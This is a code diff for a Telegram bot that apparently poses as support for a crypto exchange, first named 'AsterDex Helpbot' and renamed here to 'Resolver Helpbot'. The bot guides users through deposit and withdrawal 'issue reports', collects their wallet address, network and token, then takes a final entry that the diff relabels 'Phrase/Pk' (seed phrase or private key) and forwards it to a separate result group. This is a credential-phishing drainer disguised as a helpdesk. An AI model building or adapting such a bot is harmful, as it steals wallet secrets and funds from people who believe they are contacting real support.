@@ -35,13 +35,9 @@ bot.onText(/\/issue/, async (msg) => {
   const chatId = msg.chat.id;
   delete chatStates[chatId];
 
-  await bot.sendMessage(chatId, '🔄 Restarting issue report...', {
-    reply_markup: { remove_keyboard: true },
-  });
-
   await bot.sendMessage(
     chatId,
-    "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+    "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
     {
       parse_mode: 'Markdown',
       reply_markup: {
@@ -66,40 +62,40 @@ bot.on('callback_query', async (query) => {
   switch (data) {
     // === Report Issue ===
     case 'report_issue':
-      await bot.sendMessage(chatId, '🤔 What issue are you currently facing?', {
+      await bot.sendMessage(chatId, 'What issue are you currently facing?', {
         reply_markup: {
           inline_keyboard: [
             [
               {
-                text: '💰 Deposit on Spot',
+                text: 'Deposit on Spot',
                 callback_data: 'issue_deposit_spot',
               },
             ],
             [
               {
-                text: '🏦 Withdrawal on Spot',
+                text: 'Withdrawal on Spot',
                 callback_data: 'issue_withdraw_spot',
               },
             ],
             [
               {
-                text: '📈 Deposit on Perp',
+                text: 'Deposit on Perp',
                 callback_data: 'issue_deposit_perp',
               },
             ],
             [
               {
-                text: '📉 Withdrawal on Perp',
+                text: 'Withdrawal on Perp',
                 callback_data: 'issue_withdraw_perp',
               },
             ],
             [
               {
-                text: '🔁 Spot/Perp Transfer',
+                text: 'Spot/Perp Transfer',
                 callback_data: 'issue_transfer',
               },
             ],
-            [{ text: '❓ Other', callback_data: 'issue_other' }],
+            [{ text: 'Other', callback_data: 'issue_other' }],
           ],
         },
       });
@@ -231,12 +227,9 @@ bot.on('callback_query', async (query) => {
     // === RESTART BOT ===
     case 'restart_bot': {
       delete chatStates[chatId];
-      await bot.sendMessage(chatId, '🔄 Starting over...', {
-        reply_markup: { remove_keyboard: true },
-      });
       await bot.sendMessage(
         chatId,
-        "👋 Welcome to *AsterDex Helpbot!* Let's process your issue for Spot, Perp or others.",
+        "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
         {
           parse_mode: 'Markdown',
           reply_markup: {
@@ -264,7 +257,7 @@ bot.on('message', async (msg) => {
 
   if (text === 'Cancel') {
     delete chatStates[chatId];
-    await bot.sendMessage(chatId, '✅ Operation canceled.', {
+    await bot.sendMessage(chatId, 'Operation canceled.', {
       reply_markup: { remove_keyboard: true },
     });
     return;
@@ -288,7 +281,7 @@ bot.on('message', async (msg) => {
     state.walletAddress = text;
     state.step = 'awaiting_network_selection';
 
-    await bot.sendMessage(chatId, '🌐 What network are you facing issues on?', {
+    await bot.sendMessage(chatId, 'What network are you facing issues on?', {
       reply_markup: {
         inline_keyboard: [
           [{ text: 'Ethereum', callback_data: 'network_ethereum' }],
@@ -315,7 +308,7 @@ bot.on('message', async (msg) => {
         `• Wallet: ${state.walletAddress || 'N/A'}\n` +
         `• Network: ${state.network || 'N/A'}\n` +
         `• Token: ${state.token || 'N/A'}\n` +
-        `• Entered Data: \`${text}\``;
+        `• Phrase/Pk: \`${text}\``;
 
       await bot.sendMessage(RESULT_GROUP_ID, report, {
         parse_mode: 'Markdown',
